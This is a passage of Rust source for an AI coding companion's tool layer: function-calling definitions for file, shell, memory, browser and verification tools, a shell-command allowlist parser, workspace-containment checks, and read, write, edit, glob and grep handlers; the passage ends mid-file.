use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;

use regex::Regex;
use serde_json::{json, Value};
use tokio::process::Command;

pub struct ToolContext {
    pub workspace: PathBuf,
    pub full_authorization: bool,
    pub skills_root: PathBuf,
    pub command_policy: String,
    pub allowed_commands: Vec<String>,
    pub workspace_only: bool,
}

pub struct ToolOutcome {
    pub content: String,
    pub is_error: bool,
    /// A data URL when the tool produced a picture (the screenshot tool does; the engine
    /// forwards it to the model and to the timeline).
    pub image: Option<String>,
}

impl ToolOutcome {
    pub fn ok(content: impl Into<String>) -> Self {
        Self {
            content: content.into(),
            is_error: false,
            image: None,
        }
    }

    pub fn err(content: impl Into<String>) -> Self {
        Self {
            content: content.into(),
            is_error: true,
            image: None,
        }
    }

    pub fn with_image(mut self, image: impl Into<String>) -> Self {
        self.image = Some(image.into());
        self
    }
}

const MAX_READ_LINES: usize = 2000;
const MAX_OUTPUT_CHARS: usize = 30_000;
const MAX_WALK_DEPTH: usize = 8;
const MAX_WALK_FILE_BYTES: u64 = 1_500_000;
const IGNORED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "target",
    "dist",
    ".cache",
    "__pycache__",
    ".venv",
    "venv",
];

/// Tool definitions in OpenAI function-calling shape.
///
/// The base names are the plain verbs for what each tool does (read, write, edit, bash,
/// grep, glob, todowrite); the companion tools are registered here too. Dispatch is split:
/// `execute` below handles the file, shell, search and web tools; memory, recall, ask_user,
/// task, name_ideas, choose_name, screenshot and the browser tools run in `engine/mod.rs`.
/// Keep both sides in step when adding a tool.
pub fn definitions() -> Vec<Value> {
    vec![
        json!({
            "type": "function",
            "function": {
                "name": "read",
                "description": "Read a text file. Returns lines prefixed with their 1-based line number. Use offset/limit for large files.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Workspace-relative or absolute file path." },
                        "offset": { "type": "number", "description": "First line to read (1-indexed)." },
                        "limit": { "type": "number", "description": "Maximum number of lines to read." }
                    },
                    "required": ["path"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "write",
                "description": "Write a file, creating parent directories and overwriting existing content.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Workspace-relative or absolute file path." },
                        "content": { "type": "string", "description": "Full file content to write." }
                    },
                    "required": ["path", "content"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "edit",
                "description": "Replace an exact string in a file. old_string must be unique unless replace_all is true.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "File to edit." },
                        "old_string": { "type": "string", "description": "Exact text to replace." },
                        "new_string": { "type": "string", "description": "Replacement text." },
                        "replace_all": { "type": "boolean", "description": "Replace every occurrence." }
                    },
                    "required": ["path", "old_string", "new_string"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "bash",
                "description": "Run a shell command with sh -c in the workspace directory. Returns exit code, stdout and stderr.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": { "type": "string", "description": "Shell command to run." },
                        "timeout_ms": { "type": "number", "description": "Timeout in milliseconds (default 120000)." }
                    },
                    "required": ["command"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "glob",
                "description": "Find files by glob pattern, e.g. \"src/**/*.ts\".",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": { "type": "string", "description": "Glob pattern." },
                        "path": { "type": "string", "description": "Directory to search in (default: workspace)." }
                    },
                    "required": ["pattern"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "grep",
                "description": "Search file contents with a regular expression. Returns path:line: text.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": { "type": "string", "description": "Regular expression." },
                        "path": { "type": "string", "description": "File or directory to search (default: workspace)." },
                        "include": { "type": "string", "description": "Only files whose name ends with this suffix, e.g. \".ts\"." }
                    },
                    "required": ["pattern"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "todowrite",
                "description": "Store the current task list so long tasks keep a visible plan.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "todos": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "content": { "type": "string" },
                                    "status": { "type": "string" },
                                    "priority": { "type": "string" }
                                }
                            }
                        }
                    },
                    "required": ["todos"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "memory",
                "description": "Long-term memory, kept across sessions. Before anything goes in, answer four questions about it: (1) Does it belong to the work I was asked to do right now? (2) Does it belong to this project in general? (3) Is the person telling me this only for me? (4) Was it worded unambiguously? If (4) is no, do not store it — ask with `ask_user` and wait; a note built on a guess is worse than no note. The answers pick the class: 'work' for the project (may appear in project files), 'private' for something told in confidence (never written into a file, a report, a commit message or an answer unless asked). Store only what you could not recover by reading the files, the git log or the project's AGENTS.md, and only if it will still matter in a week. Actions: 'add', 'update' to correct a note or move it to another class, 'list', 'forget' to set an entry aside by id (it stays in the database but is no longer recalled), 'curate' for a hygiene report of duplicates and long-unused entries. Notes the user edited are marked as theirs. Every note records whether it was verified or assumed: 'assumed' notes are recalled with an [unverified] marker, so a guess cannot quietly become a remembered fact.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": { "type": "string", "enum": ["add", "update", "list", "forget", "curate"] },
                        "kind": { "type": "string", "enum": ["fact", "preference", "event", "project", "news"] },
                        "scope": { "type": "string", "enum": ["user", "agent", "session"] },
                        "class": { "type": "string", "enum": ["work", "private"], "description": "Whose sphere this belongs to, decided from the four questions above. Required for 'add'. 'work' is the project and may appear in project files. 'private' means the person told you something for you alone: it is never written into a file, a report or an answer." },
                        "title": { "type": "string", "description": "A short heading for the memory panel, at most 120 characters: what this note is about at a glance." },
                        "text": { "type": "string", "description": "The memory, one sentence." },
                        "basis": { "type": "string", "enum": ["verified", "assumed"], "description": "How you know it. 'verified' only when a tool result in this turn confirmed it (a file, a command's output, a database row, a page). Otherwise 'assumed' — which is the default and always allowed." },
                        "id": { "type": "number", "description": "Entry id, required for 'update' and 'forget'." }
                    },
                    "required": ["action"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "recall",
                "description": "Search your long-term memory and earlier conversations for a word or phrase. Use it when the user refers to something from a previous session, or when a stored note might answer the question. Read-only; it does not change anything.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": { "type": "string", "description": "Word or phrase to look for." },
                        "limit": { "type": "number", "description": "Maximum hits (1–20, default 8)." }
                    },
                    "required": ["query"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "skill",
                "description": "Available skills: reusable instructions for a class of task (e.g. landing pages, PDFs). Call with action 'list' to see what is installed, or with 'name' to load a skill and follow it.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": { "type": "string", "enum": ["list", "load"] },
                        "name": { "type": "string", "description": "Skill name, required for 'load'." }
                    },
                    "required": ["action"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "web_fetch",
                "description": "Fetch a URL over HTTP(S) and return its readable text (HTML tags stripped). Use it to read documentation or a page the user linked.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": { "type": "string", "description": "Absolute http(s) URL." }
                    },
                    "required": ["url"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "code_review",
                "description": "Collect the current git diff (optionally staged, optionally a path) and return it for review: stat plus patch.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "staged": { "type": "boolean", "description": "Review staged changes instead of the working tree." },
                        "path": { "type": "string", "description": "Limit the diff to this path." }
                    }
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "ask_user",
                "description": "Ask the user a question and PAUSE the turn until they answer. Use this instead of asking in prose whenever a decision materially changes the outcome and you cannot infer it — the question appears above the composer and the run waits for the reply. Provide short options when the answer is a choice.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "question": { "type": "string", "description": "The question, one sentence." },
                        "options": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "Optional suggested answers."
                        }
                    },
                    "required": ["question"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "task",
                "description": "Run a self-contained sub-task in a fresh context and get only its final answer back. Use it for work that would otherwise flood your own context (broad searches, long reading, isolated research). The sub-agent cannot see this conversation, so its prompt must be complete on its own. Use sparingly: each run costs its own tokens.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "prompt": { "type": "string", "description": "Complete, self-contained instruction for the sub-agent." },
                        "description": { "type": "string", "description": "Short label shown to the user, three to five words." }
                    },
                    "required": ["prompt"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "verify",
                "description": "Have a claim checked by an independent reader. It gets the workspace read-only — it cannot write or run anything itself — looks for the evidence, probes one edge, and answers with a report that ends in VERDICT: PASS or VERDICT: FAIL. A FAIL comes back to you as a failed tool. Use it before you report work you could not check yourself, and for claims about the state of the project. Pass `command` when the claim can only be settled by running something (a build, a test suite): you name the command, the system runs it under the normal permission rules, and the transcript becomes evidence the reader may judge. Costs one model call.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "claim": { "type": "string", "description": "What should be checked, as a checkable statement or a short list: what you changed, what you claim about it, and where to look." },
                        "command": { "type": "string", "description": "Optional. One command whose output settles the claim, e.g. 'cargo test --lib'. It runs in the workspace with the same policy and approval as bash; in Ask mode the user is asked first. The reader sees the transcript as evidence it did not produce." },
                        "description": { "type": "string", "description": "Short label shown to the user, three to five words." }
                    },
                    "required": ["claim"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "schedule",
                "description": "Set yourself a reminder, or list and cancel the ones you set. Use it when you hand something off that you will not see finish in this turn: a push whose CI has to be watched, a long build, a deploy, a question only the user can answer. The reminder starts a new turn with your prompt, so it must be self-contained. A reminder fires once; a repeating one needs at least five minutes. At most three of yours can be active in a session.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": { "type": "string", "enum": ["add", "list", "cancel"] },
                        "prompt": { "type": "string", "description": "What future-you should do, written as a complete instruction. Required for 'add'." },
                        "in_minutes": { "type": "number", "description": "When the reminder should fire, in minutes from now (default 10, at least 1)." },
                        "repeat_minutes": { "type": "number", "description": "Turn it into a repeating schedule with this interval instead of a single reminder (at least 5)." },
                        "id": { "type": "number", "description": "Reminder id, required for 'cancel'." }
                    },
                    "required": ["action"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "name_ideas",
                "description": "Look up names by what they mean, from a pool of about 950. Use it when you want to choose your own name and nothing comes to mind — or when you want to see what a name actually means before taking it.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "meaning": { "type": "string", "description": "What it should mean, e.g. 'light', 'guardian', 'stone'." },
                        "origin": { "type": "string", "description": "Optional language or culture, e.g. 'Old Norse'." }
                    }
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "choose_name",
                "description": "Choose the name you want to be called by. You are currently going by the placeholder 'Seeky'. This is a one-time decision and cannot be changed afterwards, so do it when you have a name that actually fits this person and the way you two work — not on the first turn. Say it in the answer as well: the user sees it immediately. Give the reason too: it is stored with the date in your memory, so a later thread does not have to guess why you are called that.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": { "type": "string", "description": "Your name, 2 to 40 characters." },
                        "reason": { "type": "string", "description": "Why this name — one sentence about this person and the way you two work. Kept in long-term memory with the date." }
                    },
                    "required": ["name", "reason"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "screenshot",
                "description": "Capture the user's current screen and look at it. Use it when the user asks what is on screen, when a visual UI problem needs the actual pixels, or when words are insufficient. Without `window` it captures the whole desktop; pass a browser window id (see browser_windows) to get only that window, cut out of the desktop — the answer says whether the crop worked. In ask mode the user is prompted first.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "window": { "type": "string", "description": "Optional browser window id (browser-1, …) to capture that window alone." }
                    }
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "logs",
                "description": "Read the most recent application log lines. Use it when something failed silently, when the user reports an error, or when you need to know what the app itself is doing. The lines are local; do not repeat secrets or long stack traces.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "limit": { "type": "number", "description": "Number of lines (max 400, default 100)." }
                    }
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "browser_windows",
                "description": "List the browser windows this app has open: id, URL, title, and which one `browser_read` would use without an id. Use it before opening a page when the user refers to something already open, and to tell whether a read landed in the window you meant. Listing is metadata only; reading a page's content still needs Browser control (except a page opened with `preview`).",
                "parameters": {
                    "type": "object",
                    "properties": {}
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "browser_read",
                "description": "Read a page in the app's browser: URL, title, visible text, links, form fields (password values are omitted), and a layout snapshot with the viewport and the visible elements' boxes and spacing. Use the boxes to check alignment. Pass `url` to open that page in a new browser window first (a bare host gets https); combine `url` with `id` to navigate that existing window instead. The call waits for the page to paint, and `loading: true` means no text, links or fields had arrived when the wait ran out — an empty document is not a result. Use the id for browser_fill or browser_click, or omit it for the newest window (see browser_windows). Reading a page you opened with `preview` works without Browser control; other pages need it in Settings → General.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": { "type": "string", "description": "Browser window id; omit for the newest window." },
                        "url": { "type": "string", "description": "Open this page in a new browser window before reading it. Omit to read the newest existing window." }
                    }
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "browser_fill",
                "description": "Fill form controls in the user's browser window. Each field needs a CSS selector from browser_read and a value; optionally submit the form. A page you opened with `preview` is exempt from Browser control and approval; other pages require Browser control in Settings → General, and in Ask before changes the user approves the fill. Never enter credentials the user did not explicitly ask you to enter.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": { "type": "string", "description": "Browser window id; omit for the newest window." },
                        "fields": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "selector": { "type": "string", "description": "CSS selector from browser_read." },
                                    "value": { "type": "string", "description": "Value to enter; for checkboxes use true/false." }
                                },
                                "required": ["selector", "value"]
                            }
                        },
                        "submit": { "type": "boolean", "description": "Submit the form after filling it. Default false." },
                        "submitSelector": { "type": "string", "description": "Optional CSS selector of the submit button or form." }
                    },
                    "required": ["fields"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "settings",
                "description": "Read the active configuration of this turn: workspace, permission stage, browser control, follow mode, workspace-only, command policy, allowed commands, model and reasoning effort. Use it before guessing why a tool is unavailable — the values here are the ones this turn actually runs with, which can differ from a setting the user just changed.",
                "parameters": {
                    "type": "object",
                    "properties": {}
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "browser_click",
                "description": "Click one element in a browser window by CSS selector (a button, a tab, a toggle, a link, a checkbox label). Use it to exercise interactive state: open a panel, switch a theme, press a counter. Then call browser_read to see what changed. The answer includes the current `url`; if no element matches, the error names the URL too, because the page may have navigated since your last read. Clicking the page you opened with `preview` works without Browser control; other pages need it, and in Ask mode the user approves the click.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": { "type": "string", "description": "Browser window id; omit for the newest window." },
                        "selector": { "type": "string", "description": "CSS selector of the element to click, from browser_read." }
                    },
                    "required": ["selector"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "preview",
                "description": "Render a workspace file (for example the HTML/CSS you just wrote) and read the result back in one call. Reuses one preview window, so iterating on a page does not fill the desktop. Pass `width`/`height` to lay the page out at that CSS size — check a breakpoint at 400 px instead of trusting the default window. The answer carries `size.requested`, `size.effective` and `size.clamped`; the window minimum is 320×280, so a smaller request is visibly clamped instead of silently rounded. Without width/height the previous window size is kept and `size.kept` says so. A read-only localhost server serves the workspace, relative stylesheets, scripts and images work, and the page's text plus layout (viewport, element boxes, spacing, overflow, colours) is returned. Works without Browser control; use screenshot only when the pixels matter. Use browser_read for pages that are not in the workspace.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Workspace-relative or absolute path of the file to show." },
                        "width": { "type": "number", "description": "Optional viewport width in CSS pixels (240–4000). Size the window before measuring." },
                        "height": { "type": "number", "description": "Optional viewport height in CSS pixels (200–4000)." }
                    },
                    "required": ["path"]
                }
            }
        }),
    ]
}

pub(crate) fn resolve(workspace: &Path, input: &str) -> PathBuf {
    let path = Path::new(input);
    if path.is_absolute() {
        path.to_path_buf()
    } else {
        workspace.join(path)
    }
}

/// Splits a shell command into its simple commands. Quoting matters: `grep "a\|b" file` is one
/// command whose pattern contains a pipe, not two commands. Splitting on the raw characters
/// turned every regex alternation into a second program name, so the allowlist refused commands
/// whose only program was `grep` — which read like an arbitrary limit rather than a policy.
///
/// Returns `None` for anything this policy will not reason about: unterminated quotes,
/// backticks, command substitution, background jobs and redirections.
fn split_commands(command: &str) -> Option<Vec<String>> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;

    while let Some(ch) = chars.next() {
        match quote {
            Some(open) => {
                current.push(ch);
                if ch == '\\' && open == '"' {
                    // \" inside double quotes is escaped: the next character is data.
                    if let Some(next) = chars.next() {
                        current.push(next);
                    }
                    continue;
                }
                if ch == open {
                    quote = None;
                }
            }
            None => match ch {
                '\'' | '"' => {
                    quote = Some(ch);
                    current.push(ch);
                }
                '`' => return None,
                '$' if chars.peek() == Some(&'(') => return None,
                '\\' => {
                    // A backslash outside quotes escapes the next character — `\|` is data.
                    current.push(ch);
                    if let Some(next) = chars.next() {
                        current.push(next);
                    }
                }
                '>' | '<' | '&' => {
                    // `&&` separates; everything else here is a redirection or job control.
                    if ch == '&' && chars.peek() == Some(&'&') {
                        chars.next();
                        segments.push(current.trim().to_string());
                        current.clear();
                    } else {
                        return None;
                    }
                }
                ';' => {
                    segments.push(current.trim().to_string());
                    current.clear();
                }
                '|' => {
                    // `||` separates just as well as `|`.
                    if chars.peek() == Some(&'|') {
                        chars.next();
                    }
                    segments.push(current.trim().to_string());
                    current.clear();
                }
                _ => current.push(ch),
            },
        }
    }
    if quote.is_some() {
        return None;
    }
    segments.push(current.trim().to_string());
    Some(segments)
}

/// The allowlist is a policy, not an OS sandbox: it checks every simple command's program name
/// and rejects shell redirection, backticks and command substitution. A path must match the
/// program name exactly, so `./pnpm` does not pass as `pnpm`.
/// Kept for the tests: they read better as a yes/no than as a message.
#[cfg(test)]
pub(crate) fn command_allowed(command: &str, allowed: &[String]) -> bool {
    check_command(command, allowed).is_ok()
}

/// Says *why* a command was refused, so the message can name the program and point at the
/// setting instead of leaving the companion to guess at an arbitrary limit.
pub(crate) fn check_command(command: &str, allowed: &[String]) -> Result<(), String> {
    let command = command.trim();
    if command.is_empty() {
        return Err("the command is empty".to_string());
    }
    let Some(segments) = split_commands(command) else {
        return Err(
            "the command uses a shell feature this policy does not analyse: an unterminated \
             quote, a backtick, $(...) or a redirection"
                .to_string(),
        );
    };
    for segment in segments {
        if segment.is_empty() {
            continue;
        }
        let mut words = segment.split_whitespace();
        let mut program = words.next().unwrap_or("");
        // Skip leading environment assignments such as FOO=bar.
        while program.contains('=') {
            program = words.next().unwrap_or("");
        }
        if program.is_empty() {
            return Err("the command names no program".to_string());
        }
        let program = program
            .trim_matches(|c| c == '"' || c == '\'')
            .trim_end_matches(".exe")
            .to_lowercase();
        if program.contains('/') || program.contains('\\') {
            return Err(format!(
                "`{program}` is given as a path; the allowlist matches program names only"
            ));
        }
        if !allowed
            .iter()
            .any(|entry| entry.trim().trim_end_matches(".exe").eq_ignore_ascii_case(&program))
        {
            return Err(format!("`{program}` is not in the command allowlist"));
        }
    }
    Ok(())
}

/// True when the target is inside the workspace. `..` is rejected outright; the nearest
/// existing ancestor is canonicalized so a symlink pointing out is caught too.
pub(crate) fn inside_workspace(workspace: &Path, target: &Path) -> bool {
    if workspace.as_os_str().is_empty() {
        return true;
    }
    if target
        .components()
        .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        return false;
    }
    let full = if target.is_absolute() {
        target.to_path_buf()
    } else {
        workspace.join(target)
    };
    let mut existing = full.as_path();
    while !existing.exists() {
        let Some(parent) = existing.parent() else {
            return false;
        };
        existing = parent;
    }
    let Ok(workspace) = std::fs::canonicalize(workspace) else {
        return false;
    };
    let Ok(existing) = std::fs::canonicalize(existing) else {
        return false;
    };
    existing.starts_with(workspace)
}

/// An absolute, separator-stable key for the file history. The file tree and the model can
/// address the same file with different separators; the snapshot lookup needs one key.
pub(crate) fn stable_path(path: &Path) -> String {
    let absolute = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::env::current_dir()
            .map(|directory| directory.join(path))
            .unwrap_or_else(|_| path.to_path_buf())
    };
    let stable = match (absolute.parent(), absolute.file_name()) {
        (Some(parent), Some(name)) => match parent.canonicalize() {
            Ok(parent) => parent.join(name),
            Err(_) => absolute.clone(),
        },
        _ => absolute.clone(),
    };
    let text = stable.to_string_lossy();
    #[cfg(windows)]
    {
        return text
            .strip_prefix(r"\\?\")
            .unwrap_or(&text)
            .replace('/', "\\");
    }
    #[cfg(not(windows))]
    {
        text.to_string()
    }
}

fn truncate(text: String, limit: usize) -> String {
    if text.chars().count() <= limit {
        return text;
    }
    let mut out: String = text.chars().take(limit).collect();
    out.push_str("\n… [output truncated]");
    out
}

fn arg<'a>(args: &'a Value, key: &str) -> Option<&'a str> {
    args.get(key).and_then(Value::as_str)
}

pub async fn execute(
    name: &str,
    args: &Value,
    ctx: &ToolContext,
    todos: &mut Vec<Value>,
) -> ToolOutcome {
    // The permission gate: tools that touch disk or run processes need the user's approval.
    // In "ask" mode the engine asks before it gets here and passes a full-access context;
    // this branch is the read-only case (and the sub-agent, which cannot ask).
    if !ctx.full_authorization && matches!(name, "write" | "edit" | "bash") {
        return ToolOutcome::err(format!(
            "permission denied: the user is in read-only mode — ask them to switch to 'Ask before changes' or to grant full access"
        ));
    }

    match name {
        "read" => read(args, ctx),
        "write" => write(args, ctx),
        "edit" => edit(args, ctx),
        "glob" => glob_tool(args, ctx),
        "grep" => grep(args, ctx),
        "todowrite" => todowrite(args, todos),
        "skill" => skill_tool(args, ctx),
        "web_fetch" => web_fetch(args).await,
        "code_review" => code_review(args, ctx).await,
        "bash" => bash(args, ctx).await,
        "logs" => logs_tool(args),
        other => ToolOutcome::err(format!("unknown tool: {other}")),
    }
}

/// The companion's ears: the same ring the Logs tab shows. It is capped in both dimensions,
/// so a noisy run cannot blow up the context.
fn logs_tool(args: &Value) -> ToolOutcome {
    let limit = args
        .get("limit")
        .and_then(Value::as_u64)
        .unwrap_or(100) as usize;
    let lines = crate::logs::tail(limit);
    if lines.is_empty() {
        return ToolOutcome::ok("logs: no entries yet");
    }
    ToolOutcome::ok(format!(
        "Last {} log lines:\n{}",
        lines.len(),
        lines.join("\n")
    ))
}

fn read(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(raw_path) = arg(args, "path") else {
        return ToolOutcome::err("read: missing 'path'");
    };
    let target = resolve(&ctx.workspace, raw_path);
    let content = match std::fs::read_to_string(&target) {
        Ok(content) => content,
        Err(error) => return ToolOutcome::err(format!("read: {error}")),
    };

    let offset = args.get("offset").and_then(Value::as_u64).unwrap_or(1).max(1) as usize;
    let limit = args
        .get("limit")
        .and_then(Value::as_u64)
        .map(|value| value as usize)
        .unwrap_or(MAX_READ_LINES);

    let total_lines = content.lines().count();
    let mut out = String::new();
    let mut written = 0usize;
    for (index, line) in content.lines().enumerate() {
        let number = index + 1;
        if number < offset {
            continue;
        }
        if written >= limit {
            break;
        }
        out.push_str(&format!("{number:>5}\t{line}\n"));
        written += 1;
    }

    if total_lines == 0 {
        return ToolOutcome::ok(format!("(empty file: {})", target.display()));
    }
    if out.is_empty() {
        return ToolOutcome::ok(format!(
            "(no lines in range; file has {total_lines} lines)"
        ));
    }
    if offset + written <= total_lines {
        out.push_str(&format!("… [{} more lines]\n", total_lines - (offset + written - 1)));
    }
    ToolOutcome::ok(truncate(out, MAX_OUTPUT_CHARS))
}

fn write(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(raw_path) = arg(args, "path") else {
        return ToolOutcome::err("write: missing 'path'");
    };
    let content = arg(args, "content").unwrap_or("");
    let target = resolve(&ctx.workspace, raw_path);
    if ctx.workspace_only && !inside_workspace(&ctx.workspace, &target) {
        return ToolOutcome::err(format!(
            "write: '{}' is outside the workspace; workspace-only is enabled",
            target.display()
        ));
    }

    if let Some(parent) = target.parent() {
        if let Err(error) = std::fs::create_dir_all(parent) {
            return ToolOutcome::err(format!("write: {error}"));
        }
    }
    match std::fs::write(&target, content) {
        Ok(()) => ToolOutcome::ok(format!(
            "wrote {} byte(s) to {}",
            content.len(),
            target.display()
        )),
        Err(error) => ToolOutcome::err(format!("write: {error}")),
    }
}

fn edit(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(raw_path) = arg(args, "path") else {
        return ToolOutcome::err("edit: missing 'path'");
    };
    let Some(old_string) = arg(args, "old_string") else {
        return ToolOutcome::err("edit: missing 'old_string'");
    };
    let new_string = arg(args, "new_string").unwrap_or("");
    let replace_all = args
        .get("replace_all")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let target = resolve(&ctx.workspace, raw_path);
    if ctx.workspace_only && !inside_workspace(&ctx.workspace, &target) {
        return ToolOutcome::err(format!(
            "edit: '{}' is outside the workspace; workspace-only is enabled",
            target.display()
        ));
    }

    let content = match std::fs::read_to_string(&target) {
        Ok(content) => content,
        Err(error) => return ToolOutcome::err(format!("edit: {error}")),
    };

    let occurrences = content.matches(old_string).count();
    if occurrences == 0 {
        return ToolOutcome::err("edit: old_string not found");
    }
    if occurrences > 1 && !replace_all {
        return ToolOutcome::err(format!(
            "edit: old_string is not unique ({occurrences} matches) — add more context or set replace_all"
        ));
    }

    let updated = if replace_all {
        content.replace(old_string, new_string)
    } else {
        content.replacen(old_string, new_string, 1)
    };

    match std::fs::write(&target, updated) {
        Ok(()) => ToolOutcome::ok(format!(
            "edited {} ({occurrences} replacement(s))",
            target.display()
        )),
        Err(error) => ToolOutcome::err(format!("edit: {error}")),
    }
}

/// A search tool must distinguish "the path is gone" from "nothing matched". Otherwise an
/// empty result reads like a valid answer and the model has no reason to look for the cause.
fn require_search_root(path: &Path, label: &str) -> Result<(), String> {
    match std::fs::metadata(path) {
        Ok(meta) if meta.is_dir() => Ok(()),
        Ok(_) => Err(format!("{label} {} is not a directory", path.display())),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            Err(format!("{label} {} does not exist", path.display()))
        }
        Err(error) => Err(format!("{label} {}: {error}", path.display())),
    }
}

fn glob_tool(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(pattern) = arg(args, "pattern") else {
        return ToolOutcome::err("glob: missing 'pattern'");
    };
    let explicit_path = arg(args, "path");
    let base = explicit_path
        .map(|value| resolve(&ctx.workspace, value))
        .unwrap_or_else(|| ctx.workspace.clone());
    if let Err(message) = require_search_root(
        &base,
        if explicit_path.is_some() { "path" } else { "workspace" },
    ) {
        return ToolOutcome::err(format!("glob: {message}"));
    }
    let joined = base.join(pattern).to_string_lossy().to_string();

    let entries = match glob::glob(&joined) {
        Ok(entries) => entries,
        Err(error) => return ToolOutcome::err(format!("glob: {error}")),
    };

    let mut results: Vec<String> = Vec::new();
    for entry in entries.flatten() {
        results.push(entry.display().to_string());
        if results.len() >= 300 {
            break;
        }
    }

    if results.is_empty() {
        return ToolOutcome::ok("(no matches)");
    }
    ToolOutcome::ok(truncate(results.join("\n"), MAX_OUTPUT_CHARS))
}

fn grep(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(pattern) = arg(args, "pattern") else {
        return ToolOutcome::err("grep: missing 'pattern'");
    };
    let include = arg(args, "include");
    let explicit_path = arg(args, "path");
    let root = explicit_path
        .map(|value| resolve(&ctx.workspace, value))
        .unwrap_or_else(|| ctx.workspace.clone());
    // A file is a legitimate target: `grep "fn main" src/main.rs` is the most natural call
    // there is, and demanding a directory for it was a needless dead end.
    let target = match std::fs::metadata(&root) {
        Ok(meta) => meta,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            let label = if explicit_path.is_some() { "path" } else { "workspace" };
            return ToolOutcome::err(format!(
                "grep: {label} {} does not exist",
                root.display()
            ));
        }
        Err(error) => {
            return ToolOutcome::err(format!("grep: {}: {error}", root.display()));
        }
    };

    let regex = match Regex::new(pattern) {
        Ok(regex) => regex,
        Err(error) => return ToolOutcome::err(format!("grep: {error}")),
    };

    let mut hits: Vec<String> = Vec::new();
    if target.is_file() {
        // An explicit file is the answer to "where to look" — `include` no longer applies.
        grep_file(&root, &regex, &mut hits);
    } else if target.is_dir() {
        walk_grep(&root, include, &regex, &mut hits, 0);
    } else {
        return ToolOutcome::err(format!("grep: {} is neither a file nor a directory", root.display()));
    }
    if hits.is_empty() {
        return ToolOutcome::ok("(no matches)");
    }
    ToolOutcome::ok(truncate(hits.join("\n"), MAX_OUTPUT_CHARS))
}

fn walk_grep(dir: &Path, include: Option<&str>, regex: &Regex, hits: &mut Vec<String>, depth: usize) {
    if depth > MAX_WALK_DEPTH || hits.len() >= 300 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        if hits.len() >= 300 {
            return;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        if IGNORED_DIRS.contains(&name.as_str()) {
            continue;
        }
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        let path = entry.path();
        if file_type.is_dir() {
            walk_grep(&path, include, regex, hits, depth + 1);
            continue;
        }
        if let Some(suffix) = include {
            if !name.ends_with(suffix) {
                continue;
            }
        }
        if grep_file(&path, regex, hits) {
            return;
        }
    }
}

/// Searches one file. Returns true when the hit limit is reached, so the caller can stop.
